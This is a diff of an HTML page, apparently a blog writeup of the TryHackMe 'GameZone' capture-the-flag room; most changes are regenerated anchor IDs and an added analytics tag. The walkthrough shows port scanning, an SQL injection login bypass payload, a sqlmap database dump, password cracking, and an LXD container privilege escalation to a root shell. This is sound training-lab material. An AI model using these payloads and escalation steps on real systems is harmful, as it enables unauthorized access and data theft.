@@ -7,7 +7,7 @@
 <meta name="author" content="Lamprinos Chatziioannou" />
 <meta name="description" content="Writeup for the GameZone ctf/walkthrough room in TryHackme." />
 <meta name="generator" content="Org Mode" />
-<link rel="preconnect" href="https://fonts.googleapis.com"> <link href="https://fonts.googleapis.com/css2?family=Fira+Sans&display=swap" rel="stylesheet"> <link href="https://fonts.googleapis.com/css2?family=Roboto+Condensed&display=swap" rel="stylesheet"> <script src="https://cdn.jsdelivr.net/gh/oyvindstegard/ox-tagfilter-js/ox-tagfilter.js"></script> <link rel="stylesheet" href="/src/rougier.css" /> <script src="/src/copy-pre.js"></script> <link rel="icon" type="image/x-icon" href="/src/favicon.ico"> <meta charset="UTF-8" name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="preconnect" href="https://fonts.googleapis.com"> <link href="https://fonts.googleapis.com/css2?family=Fira+Sans&display=swap" rel="stylesheet"> <link href="https://fonts.googleapis.com/css2?family=Roboto+Condensed&display=swap" rel="stylesheet"> <script src="https://cdn.jsdelivr.net/gh/oyvindstegard/ox-tagfilter-js/ox-tagfilter.js"></script> <link rel="stylesheet" href="/src/rougier.css" /> <script src="/src/copy-pre.js"></script> <link rel="icon" type="image/x-icon" href="/src/favicon.ico"> <meta charset="UTF-8" name="viewport" content="width=device-width, initial-scale=1.0"> <!-- Google tag (gtag.js) --> <script async src="https://www.googletagmanager.com/gtag/js?id=G-55X4GXWBKS"></script> <script> window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-55X4GXWBKS'); </script>
 </head>
 <body>
 <div id="org-div-home-and-up">
@@ -20,28 +20,28 @@
 <h2>Table of Contents</h2>
 <div id="text-table-of-contents" role="doc-toc">
 <ul>
-<li><a href="#orgd2353a9">Introduction</a></li>
-<li><a href="#org58a1907">Reconnaissance</a>
+<li><a href="#org929b2d2">Introduction</a></li>
+<li><a href="#org9d5ad4f">Reconnaissance</a>
 <ul>
-<li><a href="#org76ca46e">Web Enumeration</a></li>
+<li><a href="#org0c3a349">Web Enumeration</a></li>
 </ul>
 </li>
-<li><a href="#org52575bd">SQLi</a>
+<li><a href="#orgcbca712">SQLi</a>
 <ul>
-<li><a href="#orgee81dfb">Game Zone Portal</a></li>
-<li><a href="#orgee604e1">SQLmap</a></li>
+<li><a href="#org8e9bdeb">Game Zone Portal</a></li>
+<li><a href="#org90eb7bf">SQLmap</a></li>
 </ul>
 </li>
-<li><a href="#orge7e1e9e">Password Cracking</a></li>
-<li><a href="#org9119e11">Initial Foothold</a></li>
-<li><a href="#orgdc4aa90">Thoughts</a></li>
+<li><a href="#org4db2563">Password Cracking</a></li>
+<li><a href="#org1d7889e">Initial Foothold</a></li>
+<li><a href="#orgd643f41">Thoughts</a></li>
 </ul>
 </div>
 </div>
 
-<div id="outline-container-orgd2353a9" class="outline-2">
-<h2 id="orgd2353a9"><a href="#orgd2353a9">Introduction</a></h2>
-<div class="outline-text-2" id="text-orgd2353a9">
+<div id="outline-container-org929b2d2" class="outline-2">
+<h2 id="org929b2d2"><a href="#org929b2d2">Introduction</a></h2>
+<div class="outline-text-2" id="text-org929b2d2">
 <p>
 Take me to the <del>danger</del> game zone. Merry Christmas everyone, today is
 yet another full day and I&rsquo;ll be trying to take the most out of it. 
@@ -54,14 +54,14 @@ Once again, I&rsquo;ve modified <code>/etc/hosts</code> and my local <code>bashr
 </div>
 </div>
 
-<div id="outline-container-org58a1907" class="outline-2">
-<h2 id="org58a1907"><a href="#org58a1907">Reconnaissance</a></h2>
-<div class="outline-text-2" id="text-org58a1907">
+<div id="outline-container-org9d5ad4f" class="outline-2">
+<h2 id="org9d5ad4f"><a href="#org9d5ad4f">Reconnaissance</a></h2>
+<div class="outline-text-2" id="text-org9d5ad4f">
 <p>
 Starting with my go-to snippet for CTFs:
 </p>
 <div class="org-src-container">
-<pre class="src src-bash" id="org29c4d53">nmap -sV -sC -oG nmap.initial $IP
+<pre class="src src-bash" id="org6abb303">nmap -sV -sC -oG nmap.initial $IP
 </pre>
 </div>
 
@@ -80,14 +80,14 @@ starting the full scan (hoping it may give us something extra).
 </p>
 
 <div class="org-src-container">
-<pre class="src src-bash" id="orgb6da2d5">nmap -p- -oG nmap.full -T4 $IP
+<pre class="src src-bash" id="org7e3e43b">nmap -p- -oG nmap.full -T4 $IP
 </pre>
 </div>
 </div>
 
-<div id="outline-container-org76ca46e" class="outline-3">
-<h3 id="org76ca46e"><a href="#org76ca46e">Web Enumeration</a></h3>
-<div class="outline-text-3" id="text-org76ca46e">
+<div id="outline-container-org0c3a349" class="outline-3">
+<h3 id="org0c3a349"><a href="#org0c3a349">Web Enumeration</a></h3>
+<div class="outline-text-3" id="text-org0c3a349">
 <p>
 Visiting the website (having already started Burp Proxy at the
 background, to record everything and limited the scope appropriately),
@@ -95,7 +95,7 @@ we get a home page pointing to the Hitman games.
 </p>
 
 
-<div id="org994f3bc" class="figure">
+<div id="org0a420db" class="figure">
 <p><img src="images/Reconnaissance/20231227_084910_screenshot.png" alt="20231227_084910_screenshot.png">
 </p>
 <p><span class="figure-number">Figure 1: </span>Hitman entry page</p>
@@ -108,7 +108,7 @@ sure to run <code>gobuster</code> as well:
 </p>
 
 <div class="org-src-container">
-<pre class="src src-bash" id="org30326ce">gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -u http://$IP -o gobuster.big
+<pre class="src src-bash" id="org0effd8b">gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -u http://$IP -o gobuster.big
 </pre>
 </div>
 
@@ -130,14 +130,14 @@ Since the room <b>points</b> to SQLi, this is our next step.
 </div>
 </div>
 
-<div id="outline-container-org52575bd" class="outline-2">
-<h2 id="org52575bd"><a href="#org52575bd">SQLi</a></h2>
-<div class="outline-text-2" id="text-org52575bd">
+<div id="outline-container-orgcbca712" class="outline-2">
+<h2 id="orgcbca712"><a href="#orgcbca712">SQLi</a></h2>
+<div class="outline-text-2" id="text-orgcbca712">
 <p>
 Now, we see that in each request there is a line in the following
 form:
 </p>
-<pre class="example" id="org7aa20a0">
+<pre class="example" id="org2cb3732">
 username=reqwer&amp;password=qwerqwer&amp;x=18&amp;y=7
 </pre>
 
@@ -146,7 +146,7 @@ Sending that to intruder to test our payloads hassle free. <del>Sadly, which I a
 </p>
 
 
-<div id="orga42b510" class="figure">
+<div id="org0518532" class="figure">
 <p><img src="images/SQLi/20231227_090646_screenshot.png" alt="20231227_090646_screenshot.png">
 </p>
 <p><span class="figure-number">Figure 2: </span>Subtle Error</p>
@@ -167,7 +167,7 @@ the second field blank (should have thought of that by myself).
 <p>
 Tinkering just a little bit there I got this that worked:
 </p>
-<pre class="example" id="org3c316e1">
+<pre class="example" id="org2640d29">
 username=' or 1=1; ---&amp;password=&amp;x=0&amp;y=
 </pre>
 
@@ -176,9 +176,9 @@ Using that in our browser we get access to <i>Game Zone Portal</i>
 </p>
 </div>
 
-<div id="outline-container-orgee81dfb" class="outline-3">
-<h3 id="orgee81dfb"><a href="#orgee81dfb">Game Zone Portal</a></h3>
-<div class="outline-text-3" id="text-orgee81dfb">
+<div id="outline-container-org8e9bdeb" class="outline-3">
+<h3 id="org8e9bdeb"><a href="#org8e9bdeb">Game Zone Portal</a></h3>
+<div class="outline-text-3" id="text-org8e9bdeb">
 <p>
 Still taking advantage of Burp Suite Proxy, I&rsquo;m trying different
 payloads on the Portal&rsquo;s input field, to see what I can get:
@@ -192,25 +192,25 @@ room&rsquo;s advice<sup><a id="fnr.1" class="footref" href="#fn.1" role="doc-bac
 </div>
 </div>
 
-<div id="outline-container-orgee604e1" class="outline-3">
-<h3 id="orgee604e1"><a href="#orgee604e1">SQLmap</a></h3>
-<div class="outline-text-3" id="text-orgee604e1">
+<div id="outline-container-org90eb7bf" class="outline-3">
+<h3 id="org90eb7bf"><a href="#org90eb7bf">SQLmap</a></h3>
+<div class="outline-text-3" id="text-org90eb7bf">
 <p>
 It worked smoothly, giving us both the posts that I had already found
 <b>and</b> a hash:username combination.
 </p>
 
 <div class="org-src-container">
-<pre class="src src-bash" id="org99c8758">sqlmap -r request.txt --dbms mysql --dump
+<pre class="src src-bash" id="org64dffd6">sqlmap -r request.txt --dbms mysql --dump
 </pre>
 </div>
 </div>
 </div>
 </div>
 
-<div id="outline-container-orge7e1e9e" class="outline-2">
-<h2 id="orge7e1e9e"><a href="#orge7e1e9e">Password Cracking</a></h2>
-<div class="outline-text-2" id="text-orge7e1e9e">
+<div id="outline-container-org4db2563" class="outline-2">
+<h2 id="org4db2563"><a href="#org4db2563">Password Cracking</a></h2>
+<div class="outline-text-2" id="text-org4db2563">
 <p>
 Going to my john notes and just running john against gave me the
 password, I suspect just using the suggested command would be fine as well.
@@ -218,14 +218,14 @@ password, I suspect just using the suggested command would be fine as well.
 </div>
 </div>
 
-<div id="outline-container-org9119e11" class="outline-2">
-<h2 id="org9119e11"><a href="#org9119e11">Initial Foothold</a></h2>
-<div class="outline-text-2" id="text-org9119e11">
+<div id="outline-container-org1d7889e" class="outline-2">
+<h2 id="org1d7889e"><a href="#org1d7889e">Initial Foothold</a></h2>
+<div class="outline-text-2" id="text-org1d7889e">
 <p>
 Knowing the user:password combination we can safely login as <code>agent47</code>:
 </p>
 <div class="org-src-container">
-<pre class="src src-bash" id="org509607d">ssh agent47@gamezone.thm
+<pre class="src src-bash" id="orgeffd933">ssh agent47@gamezone.thm
 </pre>
 </div>
 
@@ -255,7 +255,7 @@ initialization that took place in my local machine. I did not deviate
 (at all) from the playbook&rsquo;s commands so it is easy for anyone to just
 follow the link and perform the same privesc.
 </p>
-<pre class="example" id="orgad8d12e">
+<pre class="example" id="org56f76c6">
 agent47@gamezone:~$ lxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.
 Image imported with fingerprint: 78495f763d90135702f6430685b5cc0f14255034c8fccda355791263fdf49354
 agent47@gamezone:~$ lxd init
@@ -273,9 +273,9 @@ agent47@gamezone:~$ lxc exec mycontainer /bin/sh
 </div>
 </div>
 
-<div id="outline-container-orgdc4aa90" class="outline-2">
-<h2 id="orgdc4aa90"><a href="#orgdc4aa90">Thoughts</a></h2>
-<div class="outline-text-2" id="text-orgdc4aa90">
+<div id="outline-container-orgd643f41" class="outline-2">
+<h2 id="orgd643f41"><a href="#orgd643f41">Thoughts</a></h2>
+<div class="outline-text-2" id="text-orgd643f41">
 <p>
 This was the first time I performed port forwarding with ssh (even
 though it did not help me at all. I just did it to get the cms flags -
